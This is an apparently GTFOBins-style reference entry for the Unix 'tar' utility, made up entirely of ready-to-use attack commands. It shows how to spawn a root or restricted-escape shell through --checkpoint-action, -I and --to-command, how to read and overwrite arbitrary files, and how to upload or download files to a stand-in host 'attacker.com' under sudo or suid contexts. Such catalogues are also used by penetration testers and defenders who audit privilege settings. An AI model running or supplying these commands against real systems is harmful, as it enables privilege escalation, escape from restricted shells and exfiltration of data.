---
type: gtfobin
name: tar
platform: Unix
functions: [download, file-read, file-write, shell, upload]
tags: [gtfobin, unix, lotl]
---

# tar

## download

```bash
tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
```
_The attacker box must have the `rmt` utility installed._
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
tar cf /dev/stdout /path/to/input-file -I 'tar xO'
```
_The file is read then passed to the specified command (e.g., `tar xO`) via standard input._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
echo DATA >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
```
_The archive can also be prepared offline then uploaded to the target._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
**Contexts:** sudo, suid, unprivileged

```bash
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```
**Contexts:** sudo, suid, unprivileged

```bash
echo '/bin/sh 0<&1' >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar xf /path/to/temp-file.tar --to-command /bin/sh
```
_The archive can also be prepared offline then uploaded to the target._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
```
_The attacker box must have the `rmt` utility installed._
**Contexts:** sudo, suid, unprivileged
